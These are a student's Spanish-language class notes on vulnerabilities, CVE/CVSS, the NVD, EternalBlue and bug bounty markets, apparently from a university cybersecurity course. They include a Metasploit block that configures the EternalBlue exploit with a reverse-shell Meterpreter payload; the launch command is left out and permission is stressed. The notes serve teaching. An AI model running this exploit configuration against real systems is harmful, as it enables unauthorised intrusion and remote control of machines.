---
asignatura: Ciberseguridad
fecha: 2026-09-29
tema: Tema 1 (1.3 a 1.5) · Clase 3 · dónde falla un sistema (CVE, CVSS, NVD)
fuente: CIBER_Clase03_diapositivas.pdf (recibido dos veces, idéntico)
---
# Ciber · Clase 3 (29/09) · Dónde falla un sistema

> Anterior: [Lab 1](2026-09-24_lab1-paseo-por-kali.md) · Práctica: [CVE en el NVD](2026-09-29_practica-clase3-cve.md) · Siguiente (Clase 4): seguridad física y el SAI

> «Lo que nmap ve como una versión, el atacante lo ve como una lista de fallos con nombre.»

## 1.3 Dónde es vulnerable un sistema
**Hardware** (servidores, discos, red, energía) · **Software** (SO y apps: aquí viven los bugs y los CVE) · **Datos** (lo que importa: que no se copien ni alteren).
El atacante **no elige el sitio más importante, sino el más débil**: disco sin cifrar, app sin actualizar o backup abandonado valen igual.

## Vulnerabilidad vs amenaza vs riesgo
| Término | Qué es | Ejemplo |
|---|---|---|
| Vulnerabilidad | Fallo o debilidad del sistema | Apache con bug conocido sin parchear |
| Amenaza | Algo/alguien que puede aprovecharlo | Atacante por internet, un descuido, un incendio |
| Riesgo | Que la amenaza use el fallo, y el daño que haría | Ese Apache expuesto a internet y sin actualizar |

La misma vulnerabilidad da riesgos distintos según a qué esté expuesta. **El fallo se arregla; el riesgo se gestiona.**

## Dos tipos de vulnerabilidad
- **Conocidas**: publicadas, con CVE y nota, en el NVD; suele haber (o llegar) parche.
- **No conocidas / día cero (zero-day)**: sin publicar, sin CVE ni parche; fallo sin parche el día en que alguien lo usa. Las más peligrosas y caras. Aquí entra el **bug bounty**: cazar y reportar en vez de vender.

## CVE y CVSS
- **CVE** = identificador único (nombre). Formato `CVE-año-número` (ej. CVE-2017-0144: descubierto en 2017, fallo nº 0144 de ese año).
- **CVSS** = gravedad de 0 a 10; **no es una opinión**: se calcula con fórmula a partir del **vector** (ej. `AV:N/AC:L/...`). Calculadora oficial: nvd.nist.gov/vuln-metrics/cvss/v3-calculator.
- Con nombre y nota se prioriza: **primero se parchea lo alto y expuesto**.

### Cómo se monta un CVE
1. Alguien lo encuentra y lo reporta (investigador, empresa, cazador de bug bounty); **primero se avisa al fabricante en privado**.
2. Una autoridad le da número: **MITRE y las CNA** (en España, **INCIBE** es una).
3. Se publica la ficha; el **NVD** la analiza y calcula el CVSS → ya es «conocida».
Camino legal: reportar en privado → arreglar → publicar. Soltarlo sin avisar deja a todos expuestos.

## NVD y CVE Details
- **NVD** (nvd.nist.gov): base de datos pública del gobierno de EE. UU.; por CVE: nota, productos y versiones afectados, qué permite, desde cuándo se conoce.
- **CVE Details** (cvedetails.com): lo mismo por fabricante/producto, ordenable por CVSS.
- Flujo: `nmap -sV` da versión exacta → la buscas en NVD/CVE Details → lista de CVE («media auditoría»).
- **No hay que memorizar CVE; hay que saber buscarlos** (Actividad 2).

```bash
nmap -sV scanme.nmap.org   # 22/tcp OpenSSH 6.6 · 80/tcp Apache httpd 2.4.7  -> Apache 2.4.7: lista de CVE
```

## Ficha de ejemplo: CVE-2017-0144 (EternalBlue)
| Campo | Valor |
|---|---|
| CVSS | 8.1 · High |
| Vector | Por red, sin contraseña |
| Producto | Windows · protocolo SMBv1 |
| Impacto | Ejecución de código en la máquina |
«Por red y sin contraseña» es lo que lo hizo gusano mundial (**WannaCry**). Un fallo local no se propaga solo.

## De la ficha al exploit (Metasploit; solo se configura, NO se lanza)
```bash
msf6 > search ms17_010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 10.0.0.15                       # objetivo (con permiso)
msf6 > set LHOST 10.0.0.9                         # tu Kali (adonde vuelve la conexión)
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > show options                               # comprobar que no falta nada
# exploit  <- AQUÍ NO: se lanza en la Clase 23, con permiso y en el lab
```
Flujo del hacking ético: ver el fallo → elegir su exploit → darle datos del objetivo.

## Ejemplos reales de CVE
| Dónde | Ejemplo | Gravedad |
|---|---|---|
| SO Windows | EternalBlue · CVE-2017-0144 | Alta · 8.1 |
| SO Linux | PwnKit · CVE-2021-4034 | Alta · 7.8 |
| Gestor web WordPress | Decenas de CVE del CMS y plugins | varias |
| Librería Log4j | Log4Shell · CVE-2021-44228 | Crítica · 10 |
| Servidor web Apache | Salto de directorio · CVE-2021-41773 | Alta · 7.5 |

## 1.5 Tipos de amenaza
| Se clasifican por | Tipos |
|---|---|
| Origen | Natural, física o humana |
| Intención | Accidental o deliberada |
| Procedencia | Interna o externa |
| La más común | Malware y sus familias (virus, gusano, troyano, ransomware, spyware) |
La que más se olvida: la **de dentro y la del descuido**; no todo ataque lleva un atacante detrás.

## Bug bounty y mercado de fallos
| Vía | Qué es | Cuánto |
|---|---|---|
| Bug bounty (legal) | Reportar a la empresa (HackerOne, Bugcrowd) | Cientos a decenas de miles; crítica, seis cifras |
| Zerodium (mercado gris) | Compra día cero para revenderlo | Hasta 2,5 M por un fallo de móvil |
| Pwn2Own (concurso) | Hackear en directo | Synacktiv hackeó un Tesla: 200.000 $ y el coche |
| Mercado negro | Venderlo a quien lo va a usar | Sin ley; te la juegas |
En HackerOne se han pagado del orden de 80 M$ en un año. La diferencia entre recompensa, pastón o delito: **a quién se lo das y con qué permiso**.

## Cómo se une todo
**Activo** (lo que proteges) → **Vulnerabilidad** (su fallo: CVE + CVSS) → **Amenaza** (quién la aprovecha) → **Riesgo** (que se junten). El mismo CVE en internet y en red interna sin salida no da el mismo riesgo.

## Deberes (para la Clase 4)
Leer 1.3–1.5 · **Test 1** (ya abierto; entra todo el Tema 1; ½ punto) · trastear CVE Details con algo propio (router, CMS, servidor).
Clase 4: seguridad física y el SAI — «menos terminal y más sentido común, pero cae en el examen igual».

## Fuentes (de las diapositivas)
NVD nvd.nist.gov/vuln/search · cvedetails.com · Exploit-DB exploit-db.com · zerodium.com/program.html · zerodayinitiative.com · CCN-CERT · INCIBE-CERT · hackerone.com · bugcrowd.com
